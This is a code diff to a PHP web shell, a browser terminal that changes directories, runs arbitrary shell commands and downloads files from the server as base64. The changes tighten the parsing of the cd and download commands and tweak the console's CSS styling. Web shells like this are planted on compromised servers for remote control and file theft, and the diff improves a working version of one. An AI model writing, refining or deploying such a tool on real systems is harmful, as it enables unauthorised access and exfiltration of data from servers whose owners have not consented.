@@ -16,13 +16,19 @@
         return $response;
     }
 
-    function cdCommand($directory) {
-        if(!@chdir($directory)) {
-            $responseCommand = "No such file or directory / Invalid permission";
+    function cdCommand($command) {
+        if(preg_match("#^cd[ ](.+)$#", $command, $match)) {
+            $directory = $match[1];
+
+            if(!@chdir($directory)) {
+                $responseCommand = "No such file or directory / Invalid permission";
+            } else {
+                $responseCommand = null;
+            }
         } else {
-            $responseCommand = null;
+            $responseCommand = "Missing/Invalid argument.";
         }
-        
+
         $response = array(
             "promptName" => getPromptName(),
             "currentPath" => getcwd(),
@@ -42,24 +48,36 @@
         return $response;
     }
 
-    function downloadCommand($filePath) {
-        if(($file = @file_get_contents($filePath)) === FALSE) {
-            $responseCommand = "No such file or directory / Invalid permission";
+    function downloadCommand($command) {
+        if(preg_match("#^download[ ](.+)$#", $command, $match)) {
+            $filePath = $match[1];
 
-            $response = array(
-                "promptName" => getPromptName(),
-                "currentPath" => getcwd(),
-                "responseCommand" => $responseCommand
-            );
+            if(($file = @file_get_contents($filePath)) === FALSE) {
+                $responseCommand = "No such file or directory / Invalid permission";
+
+                $response = array(
+                    "promptName" => getPromptName(),
+                    "currentPath" => getcwd(),
+                    "responseCommand" => $responseCommand
+                );
+            } else {
+                $responseCommand = "download";
+                $fileName = basename($filePath);
+                $fileEncoded = base64_encode($file);
+                
+                $response = array(
+                    "promptName" => getPromptName(),
+                    "currentPath" => getcwd(),
+                    "fileName" => $fileName,
+                    "file" => $fileEncoded, 
+                    "responseCommand" => $responseCommand
+                );
+            }
         } else {
-            $responseCommand = "download";
-            $fileName = basename($filePath);
-            $fileEncoded = base64_encode($file);
+            $responseCommand = "Missing/Invalid argument.";
             $response = array(
                 "promptName" => getPromptName(),
                 "currentPath" => getcwd(),
-                "fileName" => $fileName,
-                "file" => $fileEncoded, 
                 "responseCommand" => $responseCommand
             );
         }
@@ -102,9 +120,8 @@
             chdir($currentPath);
 
             # cd COMMAND
-            if (preg_match("#^cd *#", $command)) {
-                $directory = preg_replace('#^cd *#', '$1', $command);
-                $response = cdCommand($directory);
+            if (preg_match("#^cd#", $command)) {
+                $response = cdCommand($command);
             
             # pwd COMMAND 
             } else if($command == "pwd") {
@@ -115,9 +132,8 @@
                 $response = clearCommand();
             
             # download COMMAND
-            } else if(preg_match("#download *#", $command)) {
-                $filePath = preg_replace('#^download *#', '$1', $command);
-                $response = downloadCommand($filePath);
+            } else if(preg_match("#^download#", $command)) {
+                $response = downloadCommand($command);
 
             # SHELL COMMAND
             } else {
@@ -169,7 +185,7 @@
             width:100%;
             max-width:800px;
             margin: auto;
-            margin-top:60px;
+            margin-top:20px;
             margin-bottom:20px;
         }
         .header {
@@ -189,7 +205,6 @@
         .shell {
             height:480px;
             background-color:black;
-            font-family:Monospace;
             border:1px solid lime;
             overflow:auto;
         }
@@ -205,19 +220,25 @@
             #border:1px solid #0f0f0f;
         }
         .shell-prompt {
+            font-family:Monospace;
+            font-size:14px;
             font-weight:bold;
             color:lime;
             margin-right:5px;
         }
         .shell-input {
             font-family:Monospace;
+            font-size:14px;
             background:transparent;
             color:white;
             border:none;
+            outline:none;
+            -webkit-appearance: none;
             flex:1;
         }
         .response-command {
             font-family:Monospace;
+            font-size:14px;
             display:block;
             margin-top:20px;
             margin-bottom:20px;
@@ -245,9 +266,9 @@
                 font-size:12px;
             }
         }
-        @media only screen and (max-width: 360px) {
+        @media only screen and (max-width: 358px) {
             .header {
-                font-size:8px;
+                font-size:9px;
             }
         }
     </style>
